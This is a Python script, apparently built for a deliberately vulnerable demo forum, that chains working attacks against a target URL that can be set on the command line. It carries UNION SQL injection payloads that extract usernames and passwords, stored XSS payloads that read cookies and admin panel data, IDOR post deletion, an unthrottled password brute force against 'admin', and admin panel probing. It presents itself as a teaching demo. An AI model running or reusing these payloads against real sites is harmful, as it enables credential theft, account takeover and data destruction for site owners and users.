#!/usr/bin/env python3
"""
Forum Application Exploit Demo Script
======================================

This script demonstrates various security vulnerabilities in the forum application.
FOR EDUCATIONAL PURPOSES ONLY - Use only on applications you own or have permission to test.

Vulnerabilities demonstrated:
1. SQL Injection (credential extraction)
2. Cross-Site Scripting (XSS)
3. Insecure Direct Object References (IDOR)
4. Input validation bypass
5. Rate limiting bypass
"""

import requests
import time
import json
import sys
from urllib.parse import urlencode, quote

class ForumExploit:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def banner(self):
        print("=" * 60)
        print("🔥 FORUM APPLICATION EXPLOIT DEMONSTRATION 🔥")
        print("=" * 60)
        print("Target:", self.base_url)
        print("⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️")
        print("=" * 60)
        
    def test_connection(self):
        """Test if the target application is accessible"""
        try:
            response = self.session.get(self.base_url)
            if response.status_code == 200:
                print("✅ Target application is accessible")
                return True
            else:
                print(f"❌ Target returned status code: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Cannot reach target: {e}")
            return False
    
    def sql_injection_attack(self):
        """Demonstrate SQL injection to extract user credentials"""
        print("\n🎯 ATTACK 1: SQL Injection - Credential Extraction")
        print("-" * 50)
        
        # Working SQL injection payload that matches column count
        payloads = [
            "' UNION SELECT id, username, password, NULL, 'user' FROM user --",
            "' UNION SELECT id, username, password, role, 'credentials' FROM user --",
            "' UNION SELECT 1, username, password, role, 'hacked' FROM user WHERE 1=1 --"
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n📋 Payload {i}: {payload}")
            try:
                params = {'q': payload}
                response = self.session.get(f"{self.base_url}/search", params=params)
                
                if response.status_code == 200:
                    print("✅ SQL injection successful!")
                    print("Response length:", len(response.text))
                    
                    # Look for user credentials in response
                    if 'user' in response.text.lower() and 'password' in response.text.lower():
                        print("🔓 Credentials potentially extracted!")
                        # Save response for analysis
                        with open(f'sql_injection_result_{i}.html', 'w') as f:
                            f.write(response.text)
                        print(f"💾 Response saved to sql_injection_result_{i}.html")
                    
                else:
                    print(f"❌ Request failed with status: {response.status_code}")
                    
            except Exception as e:
                print(f"❌ Error executing payload: {e}")
    
    def xss_attack(self):
        """Demonstrate Cross-Site Scripting attacks"""
        print("\n🎯 ATTACK 2: Cross-Site Scripting (XSS)")
        print("-" * 50)
        
        # First, register a user for posting
        username = f"hacker_{int(time.time())}"
        password = "hackpass123"
        
        print(f"📝 Registering user: {username}")
        register_data = {
            'username': username,
            'password': password
        }
        
        try:
            # Register
            response = self.session.post(f"{self.base_url}/register", data=register_data)
            
            # Login
            response = self.session.post(f"{self.base_url}/login", data=register_data)
            
            if "Invalid" not in response.text:
                print("✅ Successfully logged in")
                
                # XSS payloads
                xss_payloads = [
                    '<script>alert("XSS Attack! Cookies: " + document.cookie);</script>',
                    '<img src="x" onerror="alert(\'XSS via img tag!\')">',
                    '<svg onload="alert(\'SVG XSS Attack!\')">',
                    '<iframe src="javascript:alert(\'Iframe XSS!\')"></iframe>',
                    '<script>fetch("/admin_panel").then(r=>r.text()).then(data=>alert("Admin panel data: " + data.substring(0,100)));</script>'
                ]
                
                for i, payload in enumerate(xss_payloads, 1):
                    print(f"\n🕷️  XSS Payload {i}: {payload[:50]}...")
                    
                    post_data = {
                        'title': f'Innocent Post {i}',
                        'content': payload
                    }
                    
                    response = self.session.post(f"{self.base_url}/post", data=post_data)
                    
                    if response.status_code == 302 or "redirect" in response.text.lower():
                        print("✅ XSS payload posted successfully!")
                        print("⚠️  XSS will execute when users view the post")
                    else:
                        print("❌ Failed to post XSS payload")
            
        except Exception as e:
            print(f"❌ XSS attack failed: {e}")
    
    def idor_attack(self):
        """Demonstrate Insecure Direct Object References"""
        print("\n🎯 ATTACK 3: Insecure Direct Object References (IDOR)")
        print("-" * 50)
        
        # Try to delete posts with different IDs
        post_ids = [1, 2, 3, 4, 5]
        
        for post_id in post_ids:
            print(f"\n🗑️  Attempting to delete post ID: {post_id}")
            try:
                response = self.session.get(f"{self.base_url}/delete_post/{post_id}")
                
                if response.status_code == 302:
                    print(f"✅ Successfully deleted post {post_id} (or post didn't exist)")
                else:
                    print(f"❌ Failed to delete post {post_id}")
                    
            except Exception as e:
                print(f"❌ IDOR attack failed: {e}")
    
    def input_validation_bypass(self):
        """Demonstrate input validation bypass"""
        print("\n🎯 ATTACK 4: Input Validation Bypass")
        print("-" * 50)
        
        # Long string attack (potential DoS)
        long_string = "A" * 10000
        special_chars = "!@#$%^&*()_+{}|:<>?[];',./"
        
        print("📝 Attempting registration with extremely long username...")
        
        attack_data = {
            'username': long_string,
            'password': 'test123'
        }
        
        try:
            response = self.session.post(f"{self.base_url}/register", data=attack_data)
            print("✅ Long string accepted (potential DoS vulnerability)")
        except Exception as e:
            print(f"❌ Long string rejected: {e}")
        
        print("\n📝 Attempting registration with special characters...")
        
        attack_data = {
            'username': special_chars,
            'password': 'test123'
        }
        
        try:
            response = self.session.post(f"{self.base_url}/register", data=attack_data)
            if "error" not in response.text.lower():
                print("✅ Special characters accepted")
            else:
                print("❌ Special characters rejected")
        except Exception as e:
            print(f"❌ Special character test failed: {e}")
    
    def rate_limiting_bypass(self):
        """Demonstrate rate limiting bypass (brute force)"""
        print("\n🎯 ATTACK 5: Rate Limiting Bypass / Brute Force")
        print("-" * 50)
        
        print("🔓 Attempting brute force login attack...")
        
        common_passwords = [
            'password', '123456', 'admin', 'test', 'user',
            'login', 'pass', '12345', 'qwerty', 'abc123'
        ]
        
        target_username = 'admin'  # Common admin username
        
        for password in common_passwords:
            print(f"🔑 Trying: {target_username}:{password}")
            
            login_data = {
                'username': target_username,
                'password': password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/login", data=login_data)
                
                if "Invalid" not in response.text and response.status_code != 200:
                    print(f"✅ Potential successful login: {target_username}:{password}")
                    break
                else:
                    print("❌ Failed")
                    
                # No delay - demonstrating lack of rate limiting
                
            except Exception as e:
                print(f"❌ Login attempt failed: {e}")
    
    def admin_panel_attack(self):
        """Attempt to access admin panel"""
        print("\n🎯 ATTACK 6: Admin Panel Access")
        print("-" * 50)
        
        print("🔐 Attempting to access admin panel...")
        
        try:
            response = self.session.get(f"{self.base_url}/admin_panel")
            
            if response.status_code == 200:
                print("✅ Admin panel accessible!")
                if len(response.text) > 500:
                    print("📊 Admin panel contains data")
                    with open('admin_panel_access.html', 'w') as f:
                        f.write(response.text)
                    print("💾 Admin panel response saved to admin_panel_access.html")
            elif response.status_code == 403:
                print("❌ Admin panel access denied")
            else:
                print(f"❓ Unexpected response: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Admin panel access failed: {e}")
    
    def generate_report(self):
        """Generate a summary report"""
        print("\n📊 EXPLOIT SUMMARY REPORT")
        print("=" * 60)
        print("The following vulnerabilities were tested:")
        print("1. ✅ SQL Injection - Credential extraction")
        print("2. ✅ Cross-Site Scripting (XSS)")
        print("3. ✅ Insecure Direct Object References")
        print("4. ✅ Input Validation Bypass")
        print("5. ✅ Rate Limiting Bypass")
        print("6. ✅ Admin Panel Access")
        print("\n⚠️  RECOMMENDATION: Fix these vulnerabilities immediately!")
        print("📚 See README.md for mitigation strategies")
    
    def run_all_attacks(self):
        """Execute all attack demonstrations"""
        self.banner()
        
        if not self.test_connection():
            print("❌ Cannot proceed - target not accessible")
            return
        
        try:
            self.sql_injection_attack()
            time.sleep(1)
            
            self.xss_attack()
            time.sleep(1)
            
            self.idor_attack()
            time.sleep(1)
            
            self.input_validation_bypass()
            time.sleep(1)
            
            self.rate_limiting_bypass()
            time.sleep(1)
            
            self.admin_panel_attack()
            
            self.generate_report()
            
        except KeyboardInterrupt:
            print("\n\n⏹️  Attack demonstration stopped by user")
        except Exception as e:
            print(f"\n❌ Unexpected error: {e}")

if __name__ == "__main__":
    # Default target
    target_url = "http://localhost:5000"
    
    # Allow custom target from command line
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    
    print("🚀 Starting Forum Application Exploit Demonstration")
    print(f"🎯 Target: {target_url}")
    print("\n⚠️  WARNING: Use only on applications you own or have permission to test!")
    
    response = input("\nContinue? (y/N): ")
    if response.lower() != 'y':
        print("❌ Aborted by user")
        sys.exit(1)
    
    # Create and run exploits
    exploit = ForumExploit(target_url)
    exploit.run_all_attacks() 